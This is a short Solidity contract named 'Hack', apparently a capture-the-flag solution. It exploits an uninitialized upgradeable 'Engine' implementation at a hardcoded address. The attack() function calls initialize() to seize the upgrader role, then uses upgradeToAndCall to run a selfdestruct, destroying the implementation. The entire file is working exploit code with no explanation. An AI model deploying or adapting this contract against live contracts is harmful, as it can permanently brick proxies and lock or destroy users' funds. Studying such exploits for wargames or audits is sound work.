// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

interface IEngine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}
// Implementation Address ---> 0x4D00735133B5B41c41967dc30794b3Dad42dE25C

contract Hack {
    IEngine _engine;

    function attack(address target) external {
        _engine = IEngine(target);

        _engine.initialize();
        _engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(msg.sender);
    }
}
